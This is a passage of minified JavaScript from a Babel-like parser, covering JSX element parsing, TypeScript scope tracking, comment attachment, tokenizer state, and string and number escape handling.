W=this.startNodeAt(Q);W.object=Y,W.property=this.jsxParseIdentifier(),Y=this.finishNode(W,"JSXMemberExpression")}return Y}jsxParseAttributeValue(){let Q;switch(this.state.type){case 5:if(Q=this.startNode(),this.setContext(e1.brace),this.next(),Q=this.jsxParseExpressionContainer(Q,e1.j_oTag),Q.expression.type==="JSXEmptyExpression")this.raise(_X.AttributeIsEmpty,Q);return Q;case 143:case 134:return this.parseExprAtom();default:throw this.raise(_X.UnsupportedJsxValue,this.state.startLoc)}}jsxParseEmptyExpression(){let Q=this.startNodeAt(this.state.lastTokEndLoc);return this.finishNodeAt(Q,"JSXEmptyExpression",this.state.startLoc)}jsxParseSpreadChild(Q){return this.next(),Q.expression=this.parseExpression(),this.setContext(e1.j_expr),this.state.canStartJSXElement=!0,this.expect(8),this.finishNode(Q,"JSXSpreadChild")}jsxParseExpressionContainer(Q,Y){if(this.match(8))Q.expression=this.jsxParseEmptyExpression();else{let W=this.parseExpression();Q.expression=W}return this.setContext(Y),this.state.canStartJSXElement=!0,this.expect(8),this.finishNode(Q,"JSXExpressionContainer")}jsxParseAttribute(){let Q=this.startNode();if(this.match(5))return this.setContext(e1.brace),this.next(),this.expect(21),Q.argument=this.parseMaybeAssignAllowIn(),this.setContext(e1.j_oTag),this.state.canStartJSXElement=!0,this.expect(8),this.finishNode(Q,"JSXSpreadAttribute");return Q.name=this.jsxParseNamespacedName(),Q.value=this.eat(29)?this.jsxParseAttributeValue():null,this.finishNode(Q,"JSXAttribute")}jsxParseOpeningElementAt(Q){let Y=this.startNodeAt(Q);if(this.eat(144))return this.finishNode(Y,"JSXOpeningFragment");return Y.name=this.jsxParseElementName(),this.jsxParseOpeningElementAfterName(Y)}jsxParseOpeningElementAfterName(Q){let Y=[];while(!this.match(56)&&!this.match(144))Y.push(this.jsxParseAttribute());return Q.attributes=Y,Q.selfClosing=this.eat(56),this.expect(144),this.finishNode(Q,"JSXOpeningElement")}jsxParseClosingElementAt(Q){let Y=this.startNodeAt(Q);if(this.eat(144))return this.finishNode(Y,"JSXClosingFragment");return Y.name=this.jsxParseElementName(),this.expect(144),this.finishNode(Y,"JSXClosingElement")}jsxParseElementAt(Q){let Y=this.startNodeAt(Q),W=[],G=this.jsxParseOpeningElementAt(Q),H=null;if(!G.selfClosing){X:for(;;)switch(this.state.type){case 143:if(Q=this.state.startLoc,this.next(),this.eat(56)){H=this.jsxParseClosingElementAt(Q);break X}W.push(this.jsxParseElementAt(Q));break;case 142:W.push(this.parseLiteral(this.state.value,"JSXText"));break;case 5:{let z=this.startNode();if(this.setContext(e1.brace),this.next(),this.match(21))W.push(this.jsxParseSpreadChild(z));else W.push(this.jsxParseExpressionContainer(z,e1.j_expr));break}default:this.unexpected()}if(QX(G)&&!QX(H)&&H!==null)this.raise(_X.MissingClosingTagFragment,H);else if(!QX(G)&&QX(H))this.raise(_X.MissingClosingTagElement,H,{openingTagName:v8(G.name)});else if(!QX(G)&&!QX(H)){if(v8(H.name)!==v8(G.name))this.raise(_X.MissingClosingTagElement,H,{openingTagName:v8(G.name)})}}if(QX(G))Y.openingFragment=G,Y.closingFragment=H;else Y.openingElement=G,Y.closingElement=H;if(Y.children=W,this.match(47))throw this.raise(_X.UnwrappedAdjacentJSXElements,this.state.startLoc);return QX(G)?this.finishNode(Y,"JSXFragment"):this.finishNode(Y,"JSXElement")}jsxParseElement(){let Q=this.state.startLoc;return this.next(),this.jsxParseElementAt(Q)}setContext(Q){let{context:Y}=this.state;Y[Y.length-1]=Q}parseExprAtom(Q){if(this.match(143))return this.jsxParseElement();else if(this.match(47)&&this.input.charCodeAt(this.state.pos)!==33)return this.replaceToken(143),this.jsxParseElement();else return super.parseExprAtom(Q)}skipSpace(){if(!this.curContext().preserveSpace)super.skipSpace()}getTokenFromCode(Q){let Y=this.curContext();if(Y===e1.j_expr){this.jsxReadToken();return}if(Y===e1.j_oTag||Y===e1.j_cTag){if(_6(Q)){this.jsxReadWord();return}if(Q===62){++this.state.pos,this.finishToken(144);return}if((Q===34||Q===39)&&Y===e1.j_oTag){this.jsxReadString(Q);return}}if(Q===60&&this.state.canStartJSXElement&&this.input.charCodeAt(this.state.pos+1)!==33){++this.state.pos,this.finishToken(143);return}super.getTokenFromCode(Q)}updateContext(Q){let{context:Y,type:W}=this.state;if(W===56&&Q===143)Y.splice(-2,2,e1.j_cTag),this.state.canStartJSXElement=!1;else if(W===143)Y.push(e1.j_oTag);else if(W===144){let G=Y[Y.length-1];if(G===e1.j_oTag&&Q===56||G===e1.j_cTag)Y.pop(),this.state.canStartJSXElement=Y[Y.length-1]===e1.j_expr;else this.setContext(e1.j_expr),this.state.canStartJSXElement=!0}else this.state.canStartJSXElement=PP(W)}};class a$ extends x5{constructor(...X){super(...X);this.tsNames=new Map}}class n$ extends h5{constructor(...X){super(...X);this.importsStack=[]}createScope(X){return this.importsStack.push(new Set),new a$(X)}enter(X){if(X===1024)this.importsStack.push(new Set);super.enter(X)}exit(){let X=super.exit();if(X===1024)this.importsStack.pop();return X}hasImport(X,J){let Q=this.importsStack.length;if(this.importsStack[Q-1].has(X))return!0;if(!J&&Q>1){for(let Y=0;Y<Q-1;Y++)if(this.importsStack[Y].has(X))return!0}return!1}declareName(X,J,Q){if(J&4096){if(this.hasImport(X,!0))this.parser.raise(S.VarRedeclaration,Q,{identifierName:X});this.importsStack[this.importsStack.length-1].add(X);return}let Y=this.currentScope(),W=Y.tsNames.get(X)||0;if(J&1024){this.maybeExportDefined(Y,X),Y.tsNames.set(X,W|16);return}if(super.declareName(X,J,Q),J&2){if(!(J&1))this.checkRedeclarationInScope(Y,X,J,Q),this.maybeExportDefined(Y,X);W=W|1}if(J&256)W=W|2;if(J&512)W=W|4;if(J&128)W=W|8;if(W)Y.tsNames.set(X,W)}isRedeclaredInScope(X,J,Q){let Y=X.tsNames.get(J);if((Y&2)>0){if(Q&256){let W=!!(Q&512),G=(Y&4)>0;return W!==G}return!0}if(Q&128&&(Y&8)>0)if(X.names.get(J)&2)return!!(Q&1);else return!1;if(Q&2&&(Y&1)>0)return!0;return super.isRedeclaredInScope(X,J,Q)}checkLocalExport(X){let{name:J}=X;if(this.hasImport(J))return;let Q=this.scopeStack.length;for(let Y=Q-1;Y>=0;Y--){let G=this.scopeStack[Y].tsNames.get(J);if((G&1)>0||(G&16)>0)return}super.checkLocalExport(X)}}class s${constructor(){this.stacks=[]}enter(X){this.stacks.push(X)}exit(){this.stacks.pop()}currentFlags(){return this.stacks[this.stacks.length-1]}get hasAwait(){return(this.currentFlags()&2)>0}get hasYield(){return(this.currentFlags()&1)>0}get hasReturn(){return(this.currentFlags()&4)>0}get hasIn(){return(this.currentFlags()&8)>0}}function v5(X,J){return(X?2:0)|(J?1:0)}class o${constructor(){this.sawUnambiguousESM=!1,this.ambiguousScriptDifferentAst=!1}sourceToOffsetPos(X){return X+this.startIndex}offsetToSourcePos(X){return X-this.startIndex}hasPlugin(X){if(typeof X==="string")return this.plugins.has(X);else{let[J,Q]=X;if(!this.hasPlugin(J))return!1;let Y=this.plugins.get(J);for(let W of Object.keys(Q))if((Y==null?void 0:Y[W])!==Q[W])return!1;return!0}}getPluginOption(X,J){var Q;return(Q=this.plugins.get(X))==null?void 0:Q[J]}}function t$(X,J){if(X.trailingComments===void 0)X.trailingComments=J;else X.trailingComments.unshift(...J)}function QS(X,J){if(X.leadingComments===void 0)X.leadingComments=J;else X.leadingComments.unshift(...J)}function iJ(X,J){if(X.innerComments===void 0)X.innerComments=J;else X.innerComments.unshift(...J)}function YX(X,J,Q){let Y=null,W=J.length;while(Y===null&&W>0)Y=J[--W];if(Y===null||Y.start>Q.start)iJ(X,Q.comments);else t$(Y,Q.comments)}class e$ extends o${addComment(X){if(this.filename)X.loc.filename=this.filename;let{commentsLen:J}=this.state;if(this.comments.length!==J)this.comments.length=J;this.comments.push(X),this.state.commentsLen++}processComment(X){let{commentStack:J}=this.state,Q=J.length;if(Q===0)return;let Y=Q-1,W=J[Y];if(W.start===X.end)W.leadingNode=X,Y--;let{start:G}=X;for(;Y>=0;Y--){let H=J[Y],z=H.end;if(z>G)H.containingNode=X,this.finalizeComment(H),J.splice(Y,1);else{if(z===G)H.trailingNode=X;break}}}finalizeComment(X){var J;let{comments:Q}=X;if(X.leadingNode!==null||X.trailingNode!==null){if(X.leadingNode!==null)t$(X.leadingNode,Q);if(X.trailingNode!==null)QS(X.trailingNode,Q)}else{let{containingNode:Y,start:W}=X;if(this.input.charCodeAt(this.offsetToSourcePos(W)-1)===44)switch(Y.type){case"ObjectExpression":case"ObjectPattern":case"RecordExpression":YX(Y,Y.properties,X);break;case"CallExpression":case"OptionalCallExpression":YX(Y,Y.arguments,X);break;case"ImportExpression":YX(Y,[Y.source,(J=Y.options)!=null?J:null],X);break;case"FunctionDeclaration":case"FunctionExpression":case"ArrowFunctionExpression":case"ObjectMethod":case"ClassMethod":case"ClassPrivateMethod":YX(Y,Y.params,X);break;case"ArrayExpression":case"ArrayPattern":case"TupleExpression":YX(Y,Y.elements,X);break;case"ExportNamedDeclaration":case"ImportDeclaration":YX(Y,Y.specifiers,X);break;case"TSEnumDeclaration":YX(Y,Y.members,X);break;case"TSEnumBody":YX(Y,Y.members,X);break;default:iJ(Y,Q)}else iJ(Y,Q)}}finalizeRemainingComments(){let{commentStack:X}=this.state;for(let J=X.length-1;J>=0;J--)this.finalizeComment(X[J]);this.state.commentStack=[]}resetPreviousNodeTrailingComments(X){let{commentStack:J}=this.state,{length:Q}=J;if(Q===0)return;let Y=J[Q-1];if(Y.leadingNode===X)Y.leadingNode=null}takeSurroundingComments(X,J,Q){let{commentStack:Y}=this.state,W=Y.length;if(W===0)return;let G=W-1;for(;G>=0;G--){let H=Y[G],z=H.end;if(H.start===Q)H.leadingNode=X;else if(z===J)H.trailingNode=X;else if(z<J)break}}}class g2{constructor(){this.flags=1024,this.startIndex=void 0,this.curLine=void 0,this.lineStart=void 0,this.startLoc=void 0,this.endLoc=void 0,this.errors=[],this.potentialArrowAt=-1,this.noArrowAt=[],this.noArrowParamsConversionAt=[],this.topicContext={maxNumOfResolvableTopics:0,maxTopicIndex:null},this.labels=[],this.commentsLen=0,this.commentStack=[],this.pos=0,this.type=140,this.value=null,this.start=0,this.end=0,this.lastTokEndLoc=null,this.lastTokStartLoc=null,this.context=[e1.brace],this.firstInvalidTemplateEscapePos=null,this.strictErrors=new Map,this.tokensLength=0}get strict(){return(this.flags&1)>0}set strict(X){if(X)this.flags|=1;else this.flags&=-2}init({strictMode:X,sourceType:J,startIndex:Q,startLine:Y,startColumn:W}){this.strict=X===!1?!1:X===!0?!0:J==="module",this.startIndex=Q,this.curLine=Y,this.lineStart=-W,this.startLoc=this.endLoc=new E6(Y,W,Q)}get maybeInArrowParameters(){return(this.flags&2)>0}set maybeInArrowParameters(X){if(X)this.flags|=2;else this.flags&=-3}get inType(){return(this.flags&4)>0}set inType(X){if(X)this.flags|=4;else this.flags&=-5}get noAnonFunctionType(){return(this.flags&8)>0}set noAnonFunctionType(X){if(X)this.flags|=8;else this.flags&=-9}get hasFlowComment(){return(this.flags&16)>0}set hasFlowComment(X){if(X)this.flags|=16;else this.flags&=-17}get isAmbientContext(){return(this.flags&32)>0}set isAmbientContext(X){if(X)this.flags|=32;else this.flags&=-33}get inAbstractClass(){return(this.flags&64)>0}set inAbstractClass(X){if(X)this.flags|=64;else this.flags&=-65}get inDisallowConditionalTypesContext(){return(this.flags&128)>0}set inDisallowConditionalTypesContext(X){if(X)this.flags|=128;else this.flags&=-129}get soloAwait(){return(this.flags&256)>0}set soloAwait(X){if(X)this.flags|=256;else this.flags&=-257}get inFSharpPipelineDirectBody(){return(this.flags&512)>0}set inFSharpPipelineDirectBody(X){if(X)this.flags|=512;else this.flags&=-513}get canStartJSXElement(){return(this.flags&1024)>0}set canStartJSXElement(X){if(X)this.flags|=1024;else this.flags&=-1025}get containsEsc(){return(this.flags&2048)>0}set containsEsc(X){if(X)this.flags|=2048;else this.flags&=-2049}get hasTopLevelAwait(){return(this.flags&4096)>0}set hasTopLevelAwait(X){if(X)this.flags|=4096;else this.flags&=-4097}curPosition(){return new E6(this.curLine,this.pos-this.lineStart,this.pos+this.startIndex)}clone(){let X=new g2;return X.flags=this.flags,X.startIndex=this.startIndex,X.curLine=this.curLine,X.lineStart=this.lineStart,X.startLoc=this.startLoc,X.endLoc=this.endLoc,X.errors=this.errors.slice(),X.potentialArrowAt=this.potentialArrowAt,X.noArrowAt=this.noArrowAt.slice(),X.noArrowParamsConversionAt=this.noArrowParamsConversionAt.slice(),X.topicContext=this.topicContext,X.labels=this.labels.slice(),X.commentsLen=this.commentsLen,X.commentStack=this.commentStack.slice(),X.pos=this.pos,X.type=this.type,X.value=this.value,X.start=this.start,X.end=this.end,X.lastTokEndLoc=this.lastTokEndLoc,X.lastTokStartLoc=this.lastTokStartLoc,X.context=this.context.slice(),X.firstInvalidTemplateEscapePos=this.firstInvalidTemplateEscapePos,X.strictErrors=this.strictErrors,X.tokensLength=this.tokensLength,X}}var YS=function(J){return J>=48&&J<=57},E$={decBinOct:new Set([46,66,69,79,95,98,101,111]),hex:new Set([46,88,95,120])},E5={bin:(X)=>X===48||X===49,oct:(X)=>X>=48&&X<=55,dec:(X)=>X>=48&&X<=57,hex:(X)=>X>=48&&X<=57||X>=65&&X<=70||X>=97&&X<=102};function k$(X,J,Q,Y,W,G){let H=Q,z=Y,$=W,V="",K=null,Z=Q,{length:q}=J;for(;;){if(Q>=q){G.unterminated(H,z,$),V+=J.slice(Z,Q);break}let B=J.charCodeAt(Q);if(WS(X,B,J,Q)){V+=J.slice(Z,Q);break}if(B===92){V+=J.slice(Z,Q);let M=GS(J,Q,Y,W,X==="template",G);if(M.ch===null&&!K)K={pos:Q,lineStart:Y,curLine:W};else V+=M.ch;({pos:Q,lineStart:Y,curLine:W}=M),Z=Q}else if(B===8232||B===8233)++Q,++W,Y=Q;else if(B===10||B===13)if(X==="template"){if(V+=J.slice(Z,Q)+`
`,++Q,B===13&&J.charCodeAt(Q)===10)++Q;++W,Z=Y=Q}else G.unterminated(H,z,$);else++Q}return{pos:Q,str:V,firstInvalidLoc:K,lineStart:Y,curLine:W,containsInvalid:!!K}}function WS(X,J,Q,Y){if(X==="template")return J===96||J===36&&Q.charCodeAt(Y+1)===123;return J===(X==="double"?34:39)}function GS(X,J,Q,Y,W,G){let H=!W;J++;let z=(V)=>({pos:J,ch:V,lineStart:Q,curLine:Y}),$=X.charCodeAt(J++);switch($){case 110:return z(`
`);case 114:return z("\r");case 120:{let V;return{code:V,pos:J}=P2(X,J,Q,Y,2,!1,H,G),z(V===null?null:String.fromCharCode(V))}case 117:{let V;return{code:V,pos:J}=JV(X,J,Q,Y,H,G),z(V===null?null:String.fromCodePoint(V))}case 116:return z("\t");case 98:return z("\b");case 118:return z("\v");case 102:return z("\f");case 13:if(X.charCodeAt(J)===10)++J;case 10:Q=J,++Y;case 8232:case 8233:return z("");case 56:case 57:if(W)return z(null);else G.strictNumericEscape(J-1,Q,Y);default:if($>=48&&$<=55){let V=J-1,Z=/^[0-7]+/.exec(X.slice(V,J+2))[0],q=parseInt(Z,8);if(q>255)Z=Z.slice(0,-1),q=parseInt(Z,8);J+=Z.length-1;let B=X.charCodeAt(J);if(Z!=="0"||B===56||B===57)if(W)return z(null);else G.strictNumericEscape(V,Q,Y);return z(String.fromCharCode(q))}return z(String.fromCharCode($))}}function P2(X,J,Q,Y,W,G,H,z){let $=J,V;if({n:V,pos:J}=XV(X,J,Q,Y,16,W,G,!1,z,!H),V===null)if(H)z.invalidEscapeSequence($,Q,Y);else J=$-1;return{code:V,pos:J}}function XV(X,J,Q,Y,W,G,H,z,$,V){let K=J,Z=W===16?E$.hex:E$.decBinOct,q=W===16?E5.hex:W===10?E5.dec:W===8?E5.oct:E5.bin,B=!1,M=0;for(let O=0,R=G==null?1/0:G;O<R;++O){let I=X.charCodeAt(J),F;if(I===95&&z!=="bail"){let T=X.charCodeAt(J-1),b=X.charCodeAt(J+1);if(!z){if(V)return{n:null,pos:J};$.numericSeparatorInEscapeSequence(J,Q,Y)}else if(Number.isNaN(b)||!q(b)||Z.has(T)||Z.has(b)){if(V)return{n:null,pos:J};$.unexpectedNumericSeparator(J,Q,Y)}++J;continue}if(I>=97)F=I-97+10;else if(I>=65)F=I-65+10;else if(YS(I))F=I-48;else F=1/0;if(F>=W)if(F<=9&&V)return{n:null,pos:J};else if(F<=9&&$.invalidDigit(J,Q,Y,W))F=0;else if(H)F=0,B=!0;else break;++J,M=M*W+F}if(J===K||G!=null&&J-K!==G||B)return{n:null,pos:J};return{n:M,pos:J}}function JV(X,J,Q,Y,W,G){let H=X.charCodeAt(J),z;if(H===123){if(++J,{code:z,pos:J}=P2(X,J,Q,Y,X.indexOf("}",J)-J,!0,W,G),++J,z!==null&&z>1114111)if(W)G.invalidCodePoint(J,Q,Y);else return{code:null,pos:J}}else({code:z,pos:J}=P2(X,J,Q,Y,4,!1,W,G));return{code:z,pos:J}}function mJ(X,J,Q){return new E6(Q,X-J,X)}var HS=new Set([103,109,115,105,121,117,100,118]);class S6{constructor(X){let J=X.startIndex||0;this.type=X.type,this.value=X.value,this.start=J+X.start,this.end=J+X.end,this.loc=new dJ(X.startLoc,X.endLoc)}}class QV extends e${constructor(X,J){super();this.isLookahead=void 0,this.tokens=[],this.errorHandlers_readInt={invalidDigit:(Q,Y,W,G)=>{if(!(this.optionFlags&2048))return!1;return this.raise(S.InvalidDigit,mJ(Q,Y,W),{radix:G}),!0},numericSeparatorInEscapeSequence:this.errorBuilder(S.NumericSeparatorInEscapeSequence),unexpectedNumericSeparator:this.errorBuilder(S.UnexpectedNumericSeparator)},this.errorHandlers_readCodePoint=Object.assign({},this.errorHandlers_readInt,{invalidEscapeSequence:this.errorBuilder(S.InvalidEscapeSequence),invalidCodePoint:this.errorBuilder(S.InvalidCodePoint)}),this.errorHandlers_readStringContents_string=Object.assign({},this.errorHandlers_readCodePoint,{strictNumericEscape:(Q,Y,W)=>{this.recordStrictModeErrors(S.StrictNumericEscape,mJ(Q,Y,W))},unterminated:(Q,Y,W)=>{throw this.raise(S.UnterminatedString,mJ(Q-1,Y,W))}}),this.errorHandlers_readStringContents_template=Object.assign({},this.errorHandlers_readCodePoint,{strictNumericEscape:this.errorBuilder(S.StrictNumericEscape),unterminated:(Q,Y,W)=>{throw this.raise(S.UnterminatedTemplate,mJ(Q,Y,W))}}),this.state=new g2,this.state.init(X),this.input=J,this.length=J.length,this.comments=[],this.isLookahead=!1}pushToken(X){this.tokens.length=this.state.tokensLength,this.tokens.push(X),++this.state.tokensLength}next(){if(this.checkKeywordEscapes(),this.optionFlags&256)this.pushToken(new S6(this.state));this.state.lastTokEndLoc=this.state.endLoc,this.state.lastTokStartLoc=this.state.startLoc,this.nextToken()}eat(X){if(this.match(X))return this.next(),!0;else return!1}match(X){return this.state.type===X}createLookaheadState(X){return{pos:X.pos,value:null,type:X.type,start:X.start,end:X.end,context:[this.curContext()],inType:X.inType,startLoc:X.startLoc,lastTokEndLoc:X.lastTokEndLoc,curLine:X.curLine,lineStart:X.lineStart,curPosition:X.curPosition}}lookahead(){let X=this.state;this.state=this.createLookaheadState(X),this.isLookahead=!0,this.nextToken(),this.isLookahead=!1;let J=this.state;return this.state=X,J}nextTokenStart(){return this.nextTokenStartSince(this.state.pos)}nextTokenStartSince(X){return w2.lastIndex=X,w2.test(this.input)?w2.lastIndex:X}lookaheadCharCode(){return this.lookaheadCharCodeSince(this.state.pos)}lookaheadCharCodeSince(X){return this.input.charCodeAt(this.nextTokenStartSince(X))}nextTokenInLineStart(){return this.nextTokenInLineStartSince(this.state.pos)}nextTokenInLineStartSince(X){return N2.lastIndex=X,N2.test(this.input)?N2.lastIndex:X}lookaheadInLineCharCode(){return this.input.charCodeAt(this.nextTokenInLineStart())}codePointAtPos(X){let J=this.input.charCodeAt(X);if((J&64512)===55296&&++X<this.input.length){let Q=this.input.charCodeAt(X);if((Q&64512)===56320)J=65536+((J&1023)<<10)+(Q&1023)}return J}setStrict(X){if(this.state.strict=X,X)this.state.strictErrors.forEach(([J,Q])=>this.raise(J,Q)),this.state.strictErrors.clear()}curContext(){return this.state.context[this.state.context.length-1]}nextToken(){if(this.skipSpace(),this.state.start=this.state.pos,!this.isLookahead)this.state.startLoc=this.state.curPosition();if(this.state.pos>=this.length){this.finishToken(140);return}this.getTokenFromCode(this.codePointAtPos(this.state.pos))}skipBlockComment(X){let J;if(!this.isLookahead)J=this.state.curPosition();let Q=this.state.pos,Y=this.input.indexOf(X,Q+2);if(Y===-1)throw this.raise(S.UnterminatedComment,this.state.curPosition());this.state.pos=Y+X.length,_5.lastIndex=Q+2;while(_5.test(this.input)&&_5.lastIndex<=Y)++this.state.curLine,this.state.lineStart=_5.lastIndex;if(this.isLookahead)return;let W={type:"CommentBlock",value:this.input.slice(Q+2,Y),start:this.sourceToOffsetPos(Q),end:this.sourceToOffsetPos(Y+X.length),loc:new dJ(J,this.state.curPosition())};if(this.optionFlags&256)this.pushToken(W);return W}skipLineComment(X){let J=this.state.pos,Q;if(!this.isLookahead)Q=this.state.curPosition();let Y=this.input.charCodeAt(this.state.pos+=X);if(this.state.pos<this.length)while(!x8(Y)&&++this.state.pos<this.length)Y=this.input.charCodeAt(this.state.pos);if(this.isLookahead)return;let W=this.state.pos,H={type:"CommentLine",value:this.input.slice(J+X,W),start:this.sourceToOffsetPos(J),end:this.sourceToOffsetPos(W),loc:new dJ(Q,this.state.curPosition())};if(this.optionFlags&256)this.pushToken(H);return H}skipSpace(){let X=this.state.pos,J=this.optionFlags&4096?[]:null;X:while(this.state.pos<this.length){let Q=this.input.charCodeAt(this.state.pos);switch(Q){case 32:case 160:case 9:++this.state.pos;break;case 13:if(this.input.charCodeAt(this.state.pos+1)===10)++this.state.pos;case 10:case 8232:case 8233:++this.state.pos,++this.state.curLine,this.state.lineStart=this.state.pos;break;case 47:switch(this.input.charCodeAt(this.state.pos+1)){case 42:{let Y=this.skipBlockComment("*/");if(Y!==void 0)this.addComment(Y),J==null||J.push(Y);break}case 47:{let Y=this.skipLineComment(2);if(Y!==void 0)this.addComment(Y),J==null||J.push(Y);break}default:break X}break;default:if(XS(Q))++this.state.pos;else if(Q===45&&!this.inModule&&this.optionFlags&8192){let Y=this.state.pos;if(this.input.charCodeAt(Y+1)===45&&this.input.charCodeAt(Y+2)===62&&(X===0||this.state.lineStart>X)){let W=this.skipLineComment(3);if(W!==void 0)this.addComment(W),J==null||J.push(W)}else break X}else if(Q===60&&!this.inModule&&this.optionFlags&8192){let Y=this.state.pos;if(this.input.charCodeAt(Y+1)===33&&this.input.charCodeAt(Y+2)===45&&this.input.charCodeAt(Y+3)===45){let W=this.skipLineComment(4);if(W!==void 0)this.addComment(W),J==null||J.push(W)}else break X}else break X}}if((J==null?void 0:J.length)>0){let Q=this.state.pos,Y={start:this.sourceToOffsetPos(X),end:this.sourceToOffsetPos(Q),comments:J,leadingNode:null,trailingNode:null,containingNode:null};this.state.commentStack.push(Y)}}finishToken(X,J){this.state.end=this.state.pos,this.state.endLoc=this.state.curPosition();let Q=this.state.type;if(this.state.type=X,this.state.value=J,!this.isLookahead)this.updateContext(Q)}replaceToken(X){this.state.type=X,this.updateContext()}readToken_numberSign(){if(this.state.pos===0&&this.readToken_interpreter())return;let X=this.state.pos+1,J=this.codePointAtPos(X);if(J>=48&&J<=57)throw this.raise(S.UnexpectedDigitAfterHash,this.state.curPosition());if(J===123||J===91&&this.hasPlugin("recordAndTuple")){if(this.expectPlugin("recordAndTuple"),this.getPluginOption("recordAndTuple","syntaxType")==="bar")throw this.raise(J===123?S.RecordExpressionHashIncorrectStartSyntaxType:S.TupleExpressionHashIncorrectStartSyntaxType,this.state.curPosition());if(this.state.pos+=2,J===123)this.finishToken(7);else this.finishToken(1)}else if(_6(J))++this.state.pos,this.finishToken(139,this.readWord1(J));else if(J===92)++this.state.pos,this.finishToken(139,this.readWord1());else this.finishOp(27,1)}readToken_dot(){let X=this.input.charCodeAt(this.state.pos+1);if(X>=48&&X<=57){this.readNumber(!0);return}if(X===46&&this.input.charCodeAt(this.state.pos+2)===46)this.state.pos+=3,this.finishToken(21);else++this.state.pos,this.finishToken(16)}readToken_slash(){if(this.input.charCodeAt(this.state.pos+1)===61)this.finishOp(31,2);else this.finishOp(56,1)}readToken_interpreter(){if(this.state.pos!==0||this.length<2)return!1;let X=this.input.charCodeAt(this.state.pos+1);if(X!==33)return!1;let J=this.state.pos;this.state.pos+=1;while(!x8(X)&&++this.state.pos<this.length)X=this.input.charCodeAt(this.state.pos);let Q=this.input.slice(J+2,this.state.pos);return this.finishToken(28,Q),!0}readToken_mult_modulo(X){let J=X===42?55:54,Q=1,Y=this.input.charCodeAt(this.state.pos+1);if(X===42&&Y===42)Q++,Y=this.input.charCodeAt(this.state.pos+2),J=57;if(Y===61&&!this.state.inType)Q++,J=X===37?33:30;this.finishOp(J,Q)}readToken_pipe_amp(X){let J=this.input.charCodeAt(this.state.pos+1);if(J===X){if(this.input.charCodeAt(this.state.pos+2)===61)this.finishOp(30,3);else this.finishOp(X===124?41:42,2);return}if(X===124){if(J===62){this.finishOp(39,2);return}if(this.hasPlugin("recordAndTuple")&&J===125){if(this.getPluginOption("recordAndTuple","syntaxType")!=="bar")throw this.raise(S.RecordExpressionBarIncorrectEndSyntaxType,this.state.curPosition());this.state.pos+=2,this.finishToken(9);return}if(this.hasPlugin("recordAndTuple")&&J===93){if(this.getPluginOption("recordAndTuple","syntaxType")!=="bar")throw this.raise(S.TupleExpressionBarIncorrectEndSyntaxType,this.state.curPosition());this.state.pos+=2,this.finishToken(4);return}}if(J===61){this.finishOp(30,2);return}this.finishOp(X===124?43:45,1)}readToken_caret(){let X=this.input.charCodeAt(this.state.pos+1);if(X===61&&!this.state.inType)this.finishOp(32,2);else if(X===94&&this.hasPlugin(["pipelineOperator",{proposal:"hack",topicToken:"^^"}])){if(this.finishOp(37,2),this.input.codePointAt(this.state.pos)===94)this.unexpected()}else this.finishOp(44,1)}readToken_atSign(){if(this.input.charCodeAt(this.state.pos+1)===64&&this.hasPlugin(["pipelineOperator",{proposal:"hack",topicToken:"@@"}]))this.finishOp(38,2);else this.finishOp(26,1)}readToken_plus_min(X){let J=this.input.charCodeAt(this.state.pos+1);if(J===X){this.finishOp(34,2);return}if(J===61)this.finishOp(30,2);else this.finishOp(53,1)}readToken_lt(){let{pos:X}=this.state,J=this.input.charCodeAt(X+1);if(J===60){if(this.input.charCodeAt(X+2)===61){this.finishOp(30,3);return}this.finishOp(51,2);return}if(J===61){this.finishOp(49,2);return}this.finishOp(47,1)}readToken_gt(){let{pos:X}=this.state,J=this.input.charCodeAt(X+1);if(J===62){let Q=this.input.charCodeAt(X+2)===62?3:2;if(this.input.charCodeAt(X+Q)===61){this.finishOp(30,Q+1);return}this.finishOp(52,Q);return}if(J===61){this.finishOp(49,2);return}this.finishOp(48,1)}readToken_eq_excl(X){let J=this.input.charCodeAt(this.state.pos+1);if(J===61){this.finishOp(46,this.input.charCodeAt(this.state.pos+2)===61?3:2);return}if(X===61&&J===62){this.state.pos+=2,this.finishToken(19);return}this.finishOp(X===61?29:35,1)}readToken_question(){let X=this.input.charCodeAt(this.state.pos+1),J=this.input.charCodeAt(this.state.pos+2);if(X===63)if(J===61)this.finishOp(30,3);else this.finishOp(40,2);else if(X===46&&!(J>=48&&J<=57))this.state.pos+=2,this.finishToken(18);else++this.state.pos,this.finishToken(17)}getTokenFromCode(X){switch(X){case 46:this.readToken_dot();return;case 40:++this.state.pos,this.finishToken(10);return;case 41:++this.state.pos,this.finishToken(11);return;case 59:++this.state.pos,this.finishToken(13);return;case 44:++this.state.pos,this.finishToken(12);return;case 91:if(this.hasPlugin("recordAndTuple")&&this.input.charCodeAt(this.state.pos+1)===124){if(this.getPluginOption("recordAndTuple","syntaxType")!=="bar")throw this.raise(S.TupleExpressionBarIncorrectStartSyntaxType,this.state.curPosition());this.state.pos+=2,this.finishToken(2)}else++this.state.pos,this.finishToken(0);return;case 93:++this.state.pos,this.finishToken(3);return;case 123:if(this.hasPlugin("recordAndTuple")&&this.input.charCodeAt(this.state.pos+1)===124){if(this.getPluginOption("recordAndTuple","syntaxType")!=="bar")throw this.raise(S.RecordExpressionBarIncorrectStartSyntaxType,this.state.curPosition());this.state.pos+=2,this.finishToken(6)}else++this.state.pos,this.finishToken(5);return;case 125:++this.state.pos,this.finishToken(8);return;case 58:if(this.hasPlugin("functionBind")&&this.input.charCodeAt(this.state.pos+1)===58)this.finishOp(15,2);else++this.state.pos,this.finishToken(14);return;case 63:this.readToken_question();return;case 96:this.readTemplateToken();return;case 48:{let J=this.input.charCodeAt(this.state.pos+1);if(J===120||J===88){this.readRadixNumber(16);return}if(J===111||J===79){this.readRadixNumber(8);return}if(J===98||J===66){this.readRadixNumber(2);return}}case 49:case 50:case 51:case 52:case 53:case 54:case 55:case 56:case 57:this.readNumber(!1);return;case 34:case 39:this.readString(X);return;case 47:this.readToken_slash();return;case 37:case 42:this.readToken_mult_modulo(X);return;case 124:case 38:this.readToken_pipe_amp(X);return;case 94:this.readToken_caret();return;case 43:case 45:this.readToken_plus_min(X);return;case 60:this.readToken_lt();return;case 62:this.readToken_gt();return;case 61:case 33:this.readToken_eq_excl(X);return;case 126:this.finishOp(36,1);return;case 64:this.readToken_atSign();return;case 35:this.readToken_numberSign();return;case 92:this.readWord();return;default:if(_6(X)){this.readWord(X);return}}throw this.raise(S.InvalidOrUnexpectedToken,this.state.curPosition(),{unexpected:String.fromCodePoint(X)})}finishOp(X,J){let 